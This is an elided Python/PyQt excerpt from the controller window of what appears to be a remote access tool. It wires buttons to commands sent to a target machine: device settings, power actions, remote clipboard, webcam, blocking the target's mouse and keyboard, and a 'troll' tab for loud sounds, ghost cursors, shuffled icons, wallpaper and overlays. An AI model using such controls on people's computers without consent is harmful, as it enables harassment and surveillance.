...
class SessionWindow(QMainWindow):
    def __init__(self, target_url, target_id=None):
        ...
        self.device_settings_tab.set_volume_signal.connect(
            lambda l: self.send_device_setting(protocol.OP_SET_VOLUME, {"level": l})
        )
        self.device_settings_tab.set_mute_signal.connect(
            lambda m: self.send_device_setting(protocol.OP_SET_MUTE, {"muted": m})
        )
        self.device_settings_tab.set_brightness_signal.connect(
            lambda l: self.send_device_setting(protocol.OP_SET_BRIGHTNESS, {"level": l})
        )
        self.device_settings_tab.set_time_signal.connect(
            lambda t: self.send_device_setting(protocol.OP_SET_TIME, {"datetime": t})
        )
        self.device_settings_tab.sync_time_signal.connect(
            lambda: self.send_device_setting(protocol.OP_SYNC_TIME, {})
        )
        self.device_settings_tab.power_action_signal.connect(
            lambda a: self.send_device_setting(protocol.OP_POWER_ACTION, {"action": a})
        )
        ...
        self.troll_tab.open_url_signal.connect(
            lambda u: self.send_troll(protocol.OP_TROLL_URL, {"url": u})
        )
        self.troll_tab.play_sound_signal.connect(
            lambda d: self.send_troll_binary(protocol.OP_TROLL_SOUND, d)
        )
        self.troll_tab.random_sound_signal.connect(
            lambda e, i: self.send_troll(
                protocol.OP_TROLL_RANDOM_SOUND, {"enabled": e, "interval_ms": i}
            )
        )
        ...
        self.troll_tab.earrape_signal.connect(
            lambda: self.send_troll(protocol.OP_TROLL_EARRAPE, {})
        )
        self.troll_tab.whisper_signal.connect(
            lambda e: self.send_troll(protocol.OP_TROLL_WHISPER, {"enabled": e})
        )
        self.troll_tab.play_video_signal.connect(
            lambda d: self.send_troll_binary(protocol.OP_TROLL_VIDEO, d)
        )
        self.troll_tab.ghost_cursor_signal.connect(
            lambda e: self.send_troll(protocol.OP_TROLL_GHOST_CURSOR, {"enabled": e})
        )
        self.troll_tab.shuffle_icons_signal.connect(
            lambda: self.send_troll(protocol.OP_TROLL_SHUFFLE_ICONS, {})
        )
        self.troll_tab.wallpaper_signal.connect(
            lambda d: self.send_troll_binary(protocol.OP_TROLL_WALLPAPER, d)
        )
        self.troll_tab.overlay_signal.connect(
            lambda t: self.send_troll(protocol.OP_TROLL_OVERLAY, {"type": t})
        )
        self.troll_tab.stop_all_signal.connect(
            lambda: self.send_troll(protocol.OP_TROLL_STOP, {})
        )
        ...
        self.clipboard_tab.delete_entry_signal.connect(
            lambda idx: self.worker.send_msg(
                bytes([protocol.OP_CLIP_DELETE])
                + json.dumps({"index": idx}).encode("utf-8")
            )
        )
    ...
    def setup_toolbar(self):
        ...
        self.act_block.setToolTip(
            "Block Remote Mouse/Keyboard (Requires Admin on Target)"
        )
    ...
    def setup_bottom_panel(self, parent_layout):
        ...
        self.input_buffer.setPlaceholderText(
            "Type keys to buffer (e.g. Hello World)..."
        )
    ...
    def toggle_input_block(self, checked):
        ...
        if self.worker.is_connected():
            ...
            payload = json.dumps(
                {"id": protocol.SETTING_BLOCK_INPUT, "value": checked}
            ).encode("utf-8")
    ...
    def on_device_error(self, device_type, error_msg):
        ...
        if device_type == "CAM":
            ...
            QMessageBox.warning(
                self, "Webcam Error", f"Remote webcam failed:\n{error_msg}"
            )
